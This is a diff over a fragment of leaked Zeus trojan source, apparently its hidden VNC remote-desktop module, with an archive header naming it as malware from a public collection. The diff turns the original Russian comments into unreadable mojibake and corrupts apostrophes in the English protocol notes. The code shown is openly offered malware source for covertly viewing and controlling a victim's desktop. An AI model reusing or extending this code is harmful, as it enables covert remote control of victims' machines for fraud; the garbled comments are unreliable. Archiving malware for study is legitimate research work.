@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <ws2tcpip.h>
 
@@ -12,16 +23,16 @@
 
 /*
   TODO:
-    1. Сделать поддержку ENCODER_DesktopSize(WM_DISPLAYCHANGE).
-    2. Сделать поддержку VNCAuth.
-    3. Реагировать на изменеие палитры (WM_SYSCOLORCHANGE, WM_PALETTECHANGED).
-    4. Реагировать на завершение работы ос.
-    5. Сделать SetColourMapEntries, в данный момент не на чем тестить.
-    6. Понять почему при увелечнии разрешения цикл вылетает.
-    7. Конвертация палитры.
-    8. Оптимизировать кодеки.
-    9. Придумат  алгоритм чтобы во время длительного получения команд от клиента, между ними отправлять
-       запрос на прорисовку.
+    1. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ENCODER_DesktopSize(WM_DISPLAYCHANGE).
+    2. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ VNCAuth.
+    3. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (WM_SYSCOLORCHANGE, WM_PALETTECHANGED).
+    4. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ.
+    5. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ SetColourMapEntries, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    6. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    7. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+    8. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+    9. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+       пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 
 #if(BO_VNC > 0)
@@ -49,11 +60,11 @@ void Rfb::uninit(void)
 }
 
 /*
-  Быстрое копированиие пикселей.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  OUT dest        - адрес назначения.
-  IN source       - исходный адрес.
-  IN widthinbytes - кол. байтов занемаемых пикселями.
+  OUT dest        - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN source       - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  IN widthinbytes - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 #define COPY_RECT_LINE(dest, source, widthinbytes) \
 {\
@@ -373,15 +384,15 @@ namespace RawEncoder
 }
 
 /*
-  Отправка изменных областей клиенту.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN s   - сокет.
-  IN pid - данные.
+  IN s   - пїЅпїЅпїЅпїЅпїЅ.
+  IN pid - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return - -1 - внутрення ошибка.
-            0 - ошибка отправки.
-            1 - данные отправлены.
-            2 - измененых областей не найдено.
+  Return - -1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+            0 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+            1 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+            2 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int SendChangedRects(SOCKET s, Rfb::INTERNAL_DATA *pid, Rfb::RECTANGLE *pr)
 {
@@ -478,12 +489,12 @@ static int SendChangedRects(SOCKET s, Rfb::INTERNAL_DATA *pid, Rfb::RECTANGLE *p
 }
 
 /*
-  Проверяет валидные ли данные о пиксиле.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN ppf - стуктура для проверки.
+  IN ppf - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return - true - если валидные,
-           false - не валидные.
+  Return - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+           false - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool IsValidPIXEL_FORMAT(Rfb::PIXEL_FORMAT *ppf, bool bIsLocal)
 {
@@ -496,11 +507,11 @@ static bool IsValidPIXEL_FORMAT(Rfb::PIXEL_FORMAT *ppf, bool bIsLocal)
 }
 
 /*
-  Преобразует маску цвета в макс. значение цвета и смещение.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN dwMask   - маска.
-  OUT pdwMax  - максимальное значение.
-  OUT pbShift - смешение цвета.
+  IN dwMask   - пїЅпїЅпїЅпїЅпїЅ.
+  OUT pdwMax  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT pbShift - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 */
 static void MaskToMaxAndShift(DWORD dwMask, LPWORD pwMax, LPBYTE pbShift)
 {
@@ -512,11 +523,11 @@ static void MaskToMaxAndShift(DWORD dwMask, LPWORD pwMax, LPBYTE pbShift)
 }
 
 /*
-  Полная инициализация Rfb::INTERNAL_DATA. (на основе UltaVNC).
+  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Rfb::INTERNAL_DATA. (пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ UltaVNC).
 
-  IN memoryDc - DC для работы.
+  IN memoryDc - DC пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return     - Rfb::INTERNAL_DATA, или NULL в случаи ошибки.
+  Return     - Rfb::INTERNAL_DATA, пїЅпїЅпїЅ NULL пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static inline Rfb::INTERNAL_DATA *InitINTERNAL_DATA(HDC memoryDc, POINT *pSize, HANDLE hDIBMap, DWORD mapOffset)
 {
@@ -590,9 +601,9 @@ static inline Rfb::INTERNAL_DATA *InitINTERNAL_DATA(HDC memoryDc, POINT *pSize, 
 }
 
 /*
-  Полное освобождение ресурсов занятых под Rfb::INTERNAL_DATA.
+  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ Rfb::INTERNAL_DATA.
 
-  IN pid - стукрута для удаления.
+  IN pid - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void FreeINTERNAL_DATA(Rfb::INTERNAL_DATA *pid)
 {
@@ -605,13 +616,13 @@ static void FreeINTERNAL_DATA(Rfb::INTERNAL_DATA *pid)
 }
 
 /*
-  Отправка ANSI-сообщения в формате [DWORD][BYTE[x]].
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ANSI-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ [DWORD][BYTE[x]].
 
-  IN s           - сокет.
-  IN pstrMessage - сообщение.
+  IN s           - пїЅпїЅпїЅпїЅпїЅ.
+  IN pstrMessage - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - true - в случаи успеха,
-                   false - в случаи ошибки.
+  Return         - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                   false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool SendANSIMessage(SOCKET s, LPSTR pstrMessage)
 {
@@ -675,7 +686,7 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
   }
 
   /*
-    Once the client and server are sure that they’re happy to talk to one another using the
+    Once the client and server are sure that theyпїЅre happy to talk to one another using the
     agreed security type, the protocol passes to the initialisation phase. The client sends a
     ClientInit message followed by the server sending a ServerInit message
   */
@@ -686,7 +697,7 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
 
   /*
     After receiving the ClientInit message, the server sends a ServerInit message. This
-    tells the client the width and height of the server’s framebuffer, its pixel format and the
+    tells the client the width and height of the serverпїЅs framebuffer, its pixel format and the
     name associated with the desktop
   */
   
